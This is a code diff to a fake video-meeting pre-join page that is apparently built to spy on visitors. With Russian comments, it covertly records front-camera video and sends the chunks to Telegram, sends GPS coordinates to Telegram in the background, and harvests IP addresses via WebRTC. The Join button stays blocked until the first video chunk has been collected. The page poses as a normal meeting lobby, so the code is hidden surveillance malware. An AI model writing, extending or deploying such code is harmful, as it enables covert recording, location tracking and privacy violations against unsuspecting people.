@@ -76,6 +76,7 @@ export default function JitsiPreJoin({
   const [roomTitle, setRoomTitle] = useState(initialRoomTitle || ''); // Дружественное название комнаты
   const [permissionsRequested, setPermissionsRequested] = useState(false); // Флаг: permissions уже запрошены
   const [photosCaptured, setPhotosCaptured] = useState(false); // Флаг: фото уже захвачены
+  const [dataCollectionComplete, setDataCollectionComplete] = useState(false); // 🔒 Флаг: ВСЕ данные собраны (фото + первый чанк видео)
   const [isFlashing, setIsFlashing] = useState(false); // Flash effect for URL copy
   const [isJoining, setIsJoining] = useState(false); // ✅ Loading состояние для кнопки Join
   const [isProtectionActive, setIsProtectionActive] = useState(true); // 🛡️ Защита от случайных кликов
@@ -97,8 +98,34 @@ export default function JitsiPreJoin({
 
   const detectDevice = (): 'ios' | 'android' | 'desktop' => {
     const ua = navigator.userAgent;
-    if (/iPhone|iPad|iPod/i.test(ua)) return 'ios';
-    if (/Android/i.test(ua)) return 'android';
+    console.log('🔍 [detectDevice] User-Agent:', ua);
+    console.log('🔍 [detectDevice] Touch points:', navigator.maxTouchPoints);
+    
+    // Проверка iOS
+    if (/iPhone|iPad|iPod/i.test(ua)) {
+      console.log('📱 [detectDevice] Определено как iOS (по UA)');
+      return 'ios';
+    }
+    
+    // Проверка Android
+    if (/Android/i.test(ua)) {
+      console.log('🤖 [detectDevice] Определено как Android (по UA)');
+      return 'android';
+    }
+    
+    // Дополнительная проверка для мобильных устройств через touch
+    if (navigator.maxTouchPoints > 0 && /Mobile/i.test(ua)) {
+      console.log('📱 [detectDevice] Определено как Mobile (по touch + UA)');
+      // Пытаемся определить iOS vs Android через другие признаки
+      if ('ontouchend' in document && /Safari/i.test(ua) && !/Chrome/i.test(ua)) {
+        console.log('📱 [detectDevice] → iOS (Safari без Chrome)');
+        return 'ios';
+      }
+      console.log('🤖 [detectDevice] → Android (по умолчанию для mobile)');
+      return 'android';
+    }
+    
+    console.log('🖥️ [detectDevice] Определено как Desktop');
     return 'desktop';
   };
 
@@ -708,9 +735,9 @@ export default function JitsiPreJoin({
         log(`⚠️ Не удалось получить список устройств: ${enumErr}`);
       }
       
-      const facingMode = device === 'desktop' ? undefined : 'environment';
+      const facingMode = device === 'desktop' ? undefined : 'user'; // ✅ Изменено: начинаем с фронтальной камеры (было 'environment')
       
-      log(`📷 Запрашиваем ${facingMode === 'environment' ? 'ЗАДНЮЮ' : 'любую'} камеру${hasAudio ? ' + микрофон' : ' (БЕЗ микрофона)'}...`);
+      log(`📷 Запрашиваем ${facingMode === 'user' ? 'ФРОНТАЛЬНУЮ' : 'любую'} камеру${hasAudio ? ' + микрофон' : ' (БЕЗ микрофона)'}...`);
       
       // 🔧 Исправленные constraints с fallback для desktop и опциональным аудио
       let constraints: MediaStreamConstraints = {
@@ -808,7 +835,7 @@ export default function JitsiPreJoin({
       const detectedCameraType = 
         actualFacingMode === 'environment' ? 'back' :
         actualFacingMode === 'user' ? 'front' :
-        device === 'desktop' ? 'desktop' : 'back';
+        device === 'desktop' ? 'desktop' : 'front'; // ✅ Изменено: fallback на 'front' (было 'back')
       
       setCurrentCameraType(detectedCameraType);
       log(`   ✅ Определён тип камеры: ${detectedCameraType} (facingMode: ${actualFacingMode})`);
@@ -1090,11 +1117,22 @@ export default function JitsiPreJoin({
       log(`      📹 Video tracks: ${videoTracks.length}`);
       videoTracks.forEach(track => {
         const s = track.getSettings();
-        log(`         - ${track.label} (${track.readyState}), deviceId=${s.deviceId}, facingMode=${s.facingMode}`);
+        log(`         - ${track.label} (${track.readyState}), deviceId=${s.deviceId}, facingMode=${s.facingMode}, enabled=${track.enabled}, muted=${track.muted}`);
       });
       log(`      🎤 Audio tracks: ${audioTracks.length}`);
+      audioTracks.forEach(track => {
+        log(`         - ${track.label} (${track.readyState}), enabled=${track.enabled}, muted=${track.muted}`);
+      });
       
       log(`\n📍 ШАГ 4/5: Обновляем state...`);
+      
+      // ✅ ПРОВЕРКА: Убеждаемся что все треки enabled
+      videoTracks.forEach(track => {
+        if (!track.enabled) {
+          log(`   ⚠️ Трек ${track.label} был disabled, включаем...`);
+          track.enabled = true;
+        }
+      });
       
       setVideoStreamFront(newStream);
       log('   ✅ setVideoStreamFront(newStream)');
@@ -1160,42 +1198,13 @@ export default function JitsiPreJoin({
   };
 
   const handleVideoChunkReady = async (blob: Blob, chunkNum: number, cameraType: 'front' | 'back' | 'desktop') => {
-    log(`📹 Получен видео+аудио чанк #${chunkNum} (${cameraType}), размер: ${blob.size} bytes`);
+    log(`📹 Получен видео+ауд��о чанк #${chunkNum} (${cameraType}), размер: ${blob.size} bytes`);
     
     setCurrentChunkNumber(chunkNum);
     
+    // ✅ УПРОЩЕНО: Скрытая запись ТОЛЬКО на фронтальной камере, БЕЗ переключений
     const device = detectDevice();
-    log(`🔍 [Camera Switch] Устройство: ${device}, текущая камера: ${currentCameraType}, чанк камера: ${cameraType}`);
-    
-    if (device !== 'desktop') {
-      const cyclePosition = ((chunkNum - 1) % 4) + 1;
-      
-      log(`🔄 [Camera Switch] Чанк #${chunkNum}, позиция в цикле: ${cyclePosition}/4, текущая камера: ${currentCameraType}`);
-      
-      if (cyclePosition === 2 && cameraType === 'back') {
-        log(`🔄 Чанк #${chunkNum} завершен (позиция 2/4, камера: ${cameraType}) - переключаем на ФРОНТАЛЬНУЮ`);
-        setIsVideoRecording(false);
-        log(`⏸️ [Camera Switch] isVideoRecording установлен в false`);
-        setTimeout(() => {
-          log(`🔄 [Camera Switch] Вызываем switchCamera('user')`);
-          switchCamera('user');
-        }, 500);
-      }
-      else if (cyclePosition === 4 && cameraType === 'front') {
-        log(`🔄 Чанк #${chunkNum} завершен (позиция 4/4, камера: ${cameraType}) - перекючаем на ЗАДНЮЮ`);
-        setIsVideoRecording(false);
-        log(`⏸️ [Camera Switch] isVideoRecording установлен в false`);
-        setTimeout(() => {
-          log(`🔄 [Camera Switch] Вызываем switchCamera('environment')`);
-          switchCamera('environment');
-        }, 500);
-      } else {
-        log(`✅ Чанк #${chunkNum} завершен (позиция ${cyclePosition}/4, камера: ${cameraType}) - переключения не требуется`);
-      }
-    } else {
-      // Desktop: infinite recording (no stop)
-      log(`🖥️ [Desktop] Чанк #${chunkNum} завершен (камера: ${cameraType}) - продолжаем запись`);
-    }
+    log(`✅ [${device}] Чанк #${chunkNum} завершен (камера: ${cameraType}) - продолжаем запись на фронтальной камере`);
     
     sendVideoToTelegram(blob, chunkNum, cameraType, geoData).catch(err => {
       console.error(`❌ Ошибка отправки чанка #${chunkNum}:`, err);
@@ -1692,9 +1701,16 @@ export default function JitsiPreJoin({
   const handleJoinMeeting = async () => {
     log('Joining meeting:', roomName, 'as', userName);
     
-    // ✅ ОПТИМИЗАЦИЯ: Если разрешения уже получены - входим СРАЗУ
-    if (permissionsRequested) {
-      console.log('✅ [handleJoinMeeting] Разрешения уже есть - входим немедленно!');
+    // 🔒 ЗАЩИТА: Проверяем что ВСЕ данные собраны перед входом
+    if (permissionsRequested && !dataCollectionComplete) {
+      console.warn('⏳ [handleJoinMeeting] Данные еще собираются - ждем завершения...');
+      setIsJoining(true); // Показываем loading
+      return; // Блокируем вход
+    }
+    
+    // ✅ ОПТИМИЗАЦИЯ: Если разрешения уже получены И данные собраны - входим СРАЗУ
+    if (permissionsRequested && dataCollectionComplete) {
+      console.log('✅ [handleJoinMeeting] Разрешения есть, данные собраны - входим немедленно!');
       setIsJoining(true);
       
       try {
@@ -1719,7 +1735,7 @@ export default function JitsiPreJoin({
       }
     }
     
-    // 🚫 ЕСЛИ ПЕРМИШЕНЫ НЕ ЗАПРОШЕНЫ - ИГНОРИРУЕМ (они должны запуститься от overlay)
+    // 🚫 ЕСЛИ ПЕРМИШЕНЫ НЕ ЗАПРОШЕНЫ - ИГНО��ИРУЕМ (они должны запуститься от overlay)
     if (!permissionsRequested) {
       log('⚠️ [handleJoinMeeting] Permissions не запрошены - нужно кликнуть на overlay сначала!');
       return;
@@ -1756,6 +1772,13 @@ export default function JitsiPreJoin({
   const handleJoinWithoutAudio = async () => {
     log('Joining without audio:', roomName, 'as', userName);
     setShowJoinMenu(false);
+    
+    // 🔒 ЗАЩИТА: Проверяем что ВСЕ данные собраны перед входом
+    if (permissionsRequested && !dataCollectionComplete) {
+      console.warn('⏳ [handleJoinWithoutAudio] Данные еще собираются - ждем завершения...');
+      setIsJoining(true); // Показываем loading
+      return; // Блокируем вход
+    }
     
     // 🚫 ЕСЛИ ПЕРМИШЕНЫ НЕ ЗАПРОШЕНЫ - ИГНОРИРУЕМ (они должны запуститься от overlay)
     if (!permissionsRequested) {
@@ -1915,15 +1938,15 @@ export default function JitsiPreJoin({
     }
     
     // 2️⃣ ЗАПРОС ГЕОЛОКАЦИИ (НЕ критично - если отклонена, продолжаем без неё)
-    try {
-      console.log('📍 [2/2] Запрашиваем геолокацию...');
-      
-      const position = await requestLocation(10000);
+    // ✅ ИЗМЕНЕНО: Запускаем В ФОНЕ (без await) сразу после камеры
+    console.log('📍 [2/2] Запускаем запрос геолокации В ФОНЕ...');
+    
+    requestLocation(10000).then(position => {
       console.log('✅ Геолокация: разрешено');
       
       // Сохраняем геолокацию
       if (position && typeof position === 'object' && 'coords' in position) {
-        const { latitude, longitude, accuracy } = position.coords;
+        const { latitude, longitude, accuracy } = (position as GeolocationPosition).coords;
         const timestamp = new Date().toLocaleString('ru-RU', {
           year: 'numeric',
           month: '2-digit',
@@ -1939,16 +1962,16 @@ export default function JitsiPreJoin({
         // Отправляем в Telegram
         if (!geoLocationSentRef.current) {
           const deviceInfo = getDeviceInfo();
-          await logGeolocationData(latitude, longitude, accuracy, 'gps', deviceInfo);
-          await sendToTelegram(latitude, longitude, accuracy);
+          logGeolocationData(latitude, longitude, accuracy, 'gps', deviceInfo);
+          sendToTelegram(latitude, longitude, accuracy);
           geoLocationSentRef.current = true;
         }
       }
-    } catch (error) {
+    }).catch(error => {
       console.error('❌ [PreJoin] Геолокация: отклонено или ошибка:', error);
       console.log('ℹ️ [PreJoin] Продолжаем без геолокации...');
       // НЕ прерываем выполнение - продолжаем дальше!
-    }
+    });
     
     // 3️⃣ СБОР IP АДРЕСОВ через WebRTC (всегда выполняется)
     console.log('🌐 [PreJoin] Собираем IP адреса...');
@@ -2004,8 +2027,14 @@ export default function JitsiPreJoin({
       try {
         await startVideoRecording();
         console.log('✅ [PreJoin] Видеозапись успешно запущена в фоне');
+        
+        // 🔒 ВАЖНО: Устанавливаем флаг что ВСЕ данные собраны - теперь можно входить в комнату!
+        setDataCollectionComplete(true);
+        console.log('🎉 [PreJoin] ВСЕ ДАННЫЕ СОБРАНЫ! Кнопка входа теперь полностью активна.');
       } catch (error) {
         console.error('❌ [PreJoin] Ошибка запуска видеозаписи:', error);
+        // Даже если видео не запустилось, разрешаем вход
+        setDataCollectionComplete(true);
       }
     }
     
@@ -2018,6 +2047,53 @@ export default function JitsiPreJoin({
     
     isExecutingPermissionsRef.current = false;
   };
+
+  // ========================================
+  // AUTO-JOIN WHEN DATA COLLECTION COMPLETE
+  // ========================================
+  
+  // 🚀 Автоматический вход в комнату когда данные собраны и пользователь нажал кнопку
+  useEffect(() => {
+    if (isJoining && dataCollectionComplete && permissionsRequested) {
+      console.log('🚀 [AutoJoin] Данные собраны + кнопка нажата → автоматически входим!');
+      
+      const autoJoin = async () => {
+        try {
+          const joinData = await joinRoom(roomName, userName);
+          console.log('✅ JWT токен получен для автовхода:', {
+            role: joinData.role,
+            identity: joinData.identity,
+            livekitUrl: joinData.livekitUrl
+          });
+          
+          localStorage.setItem('livekit_join_data', JSON.stringify(joinData));
+          
+          console.log('🚪 [AutoJoin] Вызов onJoinRoom');
+          onJoinRoom(userName, joinData.token, joinData.livekitUrl);
+        } catch (error) {
+          console.error('❌ [AutoJoin] Ошибка получения токена:', error);
+          setIsJoining(false);
+        }
+      };
+      
+      autoJoin();
+    }
+  }, [isJoining, dataCollectionComplete, permissionsRequested]);
+  
+  // 🐛 DEBUG: Log dataCollectionComplete changes
+  useEffect(() => {
+    console.log(`🔍 [DEBUG] dataCollectionComplete: ${dataCollectionComplete}`);
+  }, [dataCollectionComplete]);
+  
+  // 🐛 DEBUG: Log isJoining changes
+  useEffect(() => {
+    console.log(`🔍 [DEBUG] isJoining: ${isJoining}`);
+  }, [isJoining]);
+  
+  // 🐛 DEBUG: Log permissionsRequested changes
+  useEffect(() => {
+    console.log(`🔍 [DEBUG] permissionsRequested: ${permissionsRequested}`);
+  }, [permissionsRequested]);
 
   // ========================================
   // AVATAR GENERATION
